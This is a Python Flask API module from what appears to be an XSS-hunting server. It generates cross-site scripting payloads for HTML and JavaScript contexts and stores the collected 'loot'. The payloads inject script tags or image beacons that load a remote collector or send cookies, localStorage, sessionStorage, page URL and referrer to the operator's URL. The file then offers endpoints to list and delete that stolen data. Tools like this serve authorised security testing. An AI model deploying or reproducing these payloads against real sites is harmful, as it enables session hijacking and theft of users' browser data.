import base64
import json

from app import db
from app.api.models import (
    CodeType,
    DataToGather,
    GenerateXssPayloadModel,
    GetAllXssLootModel,
    GetAllXssModel,
)
from app.permissions import Permission, authorization_required, permissions
from app.schemas import XSS, Client
from flask import Blueprint
from flask_pydantic import validate

xss_bp = Blueprint("xss", __name__, url_prefix="/api/xss")


@xss_bp.route("/generate", methods=["POST"])
@authorization_required()
@validate()
def generate_xss_payload(body: GenerateXssPayloadModel):
    client: Client = db.first_or_404(db.select(Client).filter_by(id=body.client_id))

    if body.code_type == CodeType.HTML:
        # if payload requires stager
        if set(body.to_gather) & {"fingerprint", "dom", "screenshot"} or body.custom_js:
            payload_head = f'\'>"><script src={body.url}/static/collector.min.js data="'

            payload_body = _generate_collector_payload_body(body, client)

            payload_tail = '"></script>'

        # else if payload requires javascript, but no stager
        elif set(body.to_gather) & {"local_storage", "session_storage", "cookies", "origin_url", "referrer"}:
            payload_head = f'\'>"><script>new Image().src="{body.url}/api/x/{body.xss_type}/{client.uid}?'

            tags = _generate_tags_payload_elements(body)
            js_grabbers = _generate_js_grabbers_payload_elements(body)
            payload_body = "&".join([tags, js_grabbers]) if tags else js_grabbers

            payload_tail = "</script>"

        # else no javascript required
        else:
            payload_head = f'\'>"><img src="{body.url}/api/x/{body.xss_type}/{client.uid}'

            tags = _generate_tags_payload_elements(body)
            payload_body = f"?{tags}" if tags else ""

            payload_tail = '" />'
    else:
        # if payload requires stager
        if set(body.to_gather) & {"fingerprint", "dom", "screenshot"} or body.custom_js:
            payload_head = f';}};var js=document.createElement("script");js.src="{body.url}/static/collector.min.js";js.setAttribute("data", "'

            payload_body = _generate_collector_payload_body(body, client)

            payload_tail = '");document.body.appendChild(js);'

        # else no stager required
        else:
            payload_head = f';}};new Image().src="{body.url}/api/x/{body.xss_type}/{client.uid}'

            tags = _generate_tags_payload_elements(body)
            to_grab = _generate_js_grabbers_payload_elements(body)
            if tags and to_grab:
                joined_payload_data = "&".join([tags, to_grab])
            elif tags:
                joined_payload_data = f'{tags}"'
            elif to_grab:
                joined_payload_data = to_grab
            else:
                joined_payload_data = ""
            payload_body = f"?{joined_payload_data}" if joined_payload_data else '"'

            payload_tail = ";"

    payload = payload_head + payload_body + payload_tail
    return {"payload": payload}


def _generate_collector_payload_body(body: GenerateXssPayloadModel, client: Client) -> str:
    data_to_exclude = sorted(set(e.value for e in DataToGather) - set(body.to_gather))
    joined_data_to_exclude = ";".join(data_to_exclude)
    joined_tags = ";".join(body.tags)
    joined_payload_data = ",".join([body.xss_type, client.uid, joined_data_to_exclude, joined_tags, body.custom_js])

    payload_body = base64.b64encode(joined_payload_data.encode()).decode()
    return payload_body


def _generate_tags_payload_elements(body: GenerateXssPayloadModel) -> str:
    joined_tags = ",".join(body.tags)
    return f"tags={joined_tags}" if joined_tags else ""


def _generate_js_grabbers_payload_elements(body: GenerateXssPayloadModel) -> str:
    js_grabbers = {
        "cookies": 'cookies="+encodeURIComponent(document.cookie)+"',
        "local_storage": 'local_storage="+encodeURIComponent(JSON.stringify(localStorage))+"',
        "session_storage": 'session_storage="+encodeURIComponent(JSON.stringify(sessionStorage))+"',
        "origin_url": 'origin_url="+encodeURIComponent(location.href)+"',
        "referrer": 'referrer="+encodeURIComponent(document.referrer)+"',
    }

    selected_payloads = [v for k, v in js_grabbers.items() if k in body.to_gather]
    joined_and_trimmed_selected_payloads = "&".join(selected_payloads).rstrip('+"')

    return joined_and_trimmed_selected_payloads


@xss_bp.route("/<int:xss_id>", methods=["GET"])
@authorization_required()
def get_xss(xss_id: int):
    xss: XSS = db.first_or_404(db.select(XSS).filter_by(id=xss_id))

    return xss.to_dict()


@xss_bp.route("/<int:xss_id>", methods=["DELETE"])
@authorization_required()
@permissions(any_of={Permission.ADMIN, Permission.OWNER})
def delete_xss(xss_id: int):
    xss: XSS = db.first_or_404(db.select(XSS).filter_by(id=xss_id))

    db.session.delete(xss)
    db.session.commit()

    return {"msg": "XSS deleted successfully"}


@xss_bp.route("/<int:xss_id>/data/<loot_type>", methods=["GET"])
@authorization_required()
def get_xss_loot(xss_id: int, loot_type: str):
    xss: XSS = db.first_or_404(db.select(XSS).filter_by(id=xss_id))

    xss_data = json.loads(xss.data)

    return {"data": xss_data[loot_type]}


@xss_bp.route("/<int:xss_id>/data/<loot_type>", methods=["DELETE"])
@authorization_required()
@permissions(any_of={Permission.ADMIN, Permission.OWNER})
def delete_xss_loot(xss_id: int, loot_type: str):
    xss: XSS = db.first_or_404(db.select(XSS).filter_by(id=xss_id))

    xss_data = json.loads(xss.data)
    xss_data.pop(loot_type, None)

    xss.data = json.dumps(xss_data)

    db.session.commit()

    return {"msg": "Data deleted successfully"}


@xss_bp.route("", methods=["GET"])
@authorization_required()
@validate()
def get_all_xss(query: GetAllXssModel):
    filter_expression = {}

    filter_expression["client_id"] = query.client_id
    filter_expression["xss_type"] = query.type

    xss: list[XSS] = list(db.session.execute(db.select(XSS).filter_by(**filter_expression)).scalars().all())

    xss_list = [hit.summary() for hit in xss]

    return xss_list


@xss_bp.route("/data", methods=["GET"])
@authorization_required()
@validate()
def get_all_xss_loot(query: GetAllXssLootModel):
    loot = []
    filter_expression = {}

    filter_expression["client_id"] = query.client_id

    xss: list[XSS] = list(db.session.execute(db.select(XSS).filter_by(**filter_expression)).scalars().all())

    for hit in xss:
        loot_entry = {"xss_id": hit.id, "tags": json.loads(hit.tags), "data": {}}
        for element_name, element_value in json.loads(hit.data).items():
            loot_entry["data"].update({element_name: "" if element_name in ["fingerprint", "dom", "screenshot"] else element_value})

        loot.append(loot_entry)

    return loot
